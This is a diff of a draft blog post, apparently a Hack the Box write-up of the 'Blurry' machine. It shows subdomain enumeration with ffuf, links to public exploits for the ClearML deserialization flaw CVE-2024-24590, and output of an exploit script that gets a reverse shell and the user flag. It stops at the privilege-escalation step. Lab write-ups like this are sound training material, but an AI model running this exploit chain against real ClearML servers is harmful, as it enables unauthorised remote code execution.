@@ -1,15 +1,15 @@
 ---
 draft: true
-title: "Hack the Box #5 - Blurry w/o Metasploit"
-date: 2024-05-06T17:27:24+00:00
+title: 
+date: 2024-08-13
 author: William
-category:
-  - Tech
+category: 
 tags: 
 cover:
   image: test
   alt: test
 ---
+
 Lets give this bad boy a go on a lovely Saturday afternoon
 
 What can nmap tell us about this target
@@ -38,51 +38,63 @@ Service detection performed. Please report any incorrect results at <https://nma
 
 Lets add `app.blurry.htb` to our hosts file and run some subdomain enumeration tool to see what else is out there
 
-```bash
-└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u <http://10.10.11.19> -H "HOST: FUZZ.blurry.htb" -ac -o ffuf.scan
 
-        /'___\\  /'___\\           /'___\\       
-       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       
-       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      
-        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      
-         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       
-          \\/_/    \\/_/   \\/___/    \\/_/       
+```bash
+└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.19 -H "HOST: FUZZ.blurry.htb" -ac -o ffuf.scan
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 _______________________________________________
 
 ...
 app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 11ms]
 files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 21ms]
 chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 56ms]
-
 ```
 
-So we have `app` , `files` , `chat` subdomains. Adding these to the hosts file lets enumerate each of these for their sub directories
+
+So we have app , files , chat subdomains. Adding these to the hosts file lets enumerate each of these for their sub directories
+
+
 
 The `app` subdomain is running a app called clear..ml and with some trusty googling we find this vuln [https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit)
 
 [https://github.com/diegogarciayala/CVE-2024-24590-ClearML-RCE-CMD-POC/tree/main](https://github.com/diegogarciayala/CVE-2024-24590-ClearML-RCE-CMD-POC/tree/main)
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/56824cb3-00a6-486d-b75d-1d36e1bff8d2/8081a281-43e7-4dea-9dfc-5798189aaf84/4b19ce42-12af-49dd-9049-396e5c9d5c2e.png)
+
+
+![keys](https://i.imgur.com/457thdA.png#center)
+
+
+
 
 In configuring thios we get failed to reolve `api` add hto hosts Add all subdomains to hosts file
 
+
+
+
+
+
 ```bash
-─$ python3 exploit.py                                                    
-                                                                                                                               
-    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⠄⠄⠄⠄⠄⣠⣴⣶⣾⣿⣿⣿⣷⣶⣤⣀⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⡿⠿⠟⠛⠻⠿⣿⣿⣿⡷⠆⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⠄⢠⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠉⠛⠁⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⢠⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⢸⣿⣿⡇⠄⠄⠄⠄⣠⣾⠿⢿⡶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⢸⣿⣿⣿⣿⡇⠄⠄⠄⠄⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⣿⣿⣿⣿⣷⡀⠄⠄⠄⠙⠿⣶⡾⠟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠘⣿⣿⣿⣿⣷⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⠘⢿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣠⣤⣴⣿⣿⣷⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⠄⠄⠄⠄⠈⠛⠻⠿⣿⣿⡏⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                 
-    
+└──$ python3 exploit.py                                                    
+                                           
+    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⠄⠄⠄⠄⠄⣠⣴⣶⣾⣿⣿⣿⣷⣶⣤⣀⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⡿⠿⠟⠛⠻⠿⣿⣿⣿⡷⠆⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⠄⢠⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠉⠛⠁⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⢠⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⢸⣿⣿⡇⠄⠄⠄⠄⣠⣾⠿⢿⡶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⢸⣿⣿⣿⣿⡇⠄⠄⠄⠄⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⣿⣿⣿⣿⣷⡀⠄⠄⠄⠙⠿⣶⡾⠟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠘⣿⣿⣿⣿⣷⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⠘⢿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣠⣤⣴⣿⣿⣷⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⠄⠄⠄⠄⠈⠛⠻⠿⣿⣿⡏⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                     
+    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                      
 CVE-2024-24590 - ClearML RCE
 ============================
 [1] Initialize ClearML
@@ -93,9 +105,9 @@ CVE-2024-24590 - ClearML RCE
 [+] Initializing ClearML
 [i] Press enter after pasting the configuration
 ...
-Web App: <http://app.blurry.htb>
-API: <http://api.blurry.htb>
-File Store: <http://files.blurry.htb>
+Web App: http://app.blurry.htb
+API: http://api.blurry.htb
+File Store: http://files.blurry.htb
 ...
 ClearML setup completed successfully.
 
@@ -104,6 +116,7 @@ ClearML setup completed successfully.
 The script politoly offers to execute the exploit but fails due to it needing pwncat
 
 self report i know but after installing it
+
 
 ```bash
 └─$ python3 exploit.py
@@ -121,7 +134,7 @@ self report i know but after installing it
 [+] pwncat listener started on 1234
 [i] This exploit requires that another user deserializes the payload on their machine.
 ClearML Task: created new task id=3df2aa3a66144bbbbdba441a8689b4ed
-ClearML results page: <http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/3df2aa3a66144bbbbdba441a8689b4ed/output/log>
+ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/3df2aa3a66144bbbbdba441a8689b4ed/output/log
 [i] Please wait...
 ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
 bash: cannot set terminal process group (220630): Inappropriate ioctl for device
@@ -130,12 +143,14 @@ jippity@blurry:~$
 
 ```
 
+
 followed up with a
 
 ```bash
 jippity@blurry:~$ cat user.txt
 ================ USER_FLAG ================
 ```
+
 
 Now to get some persistence and escalate to root
 
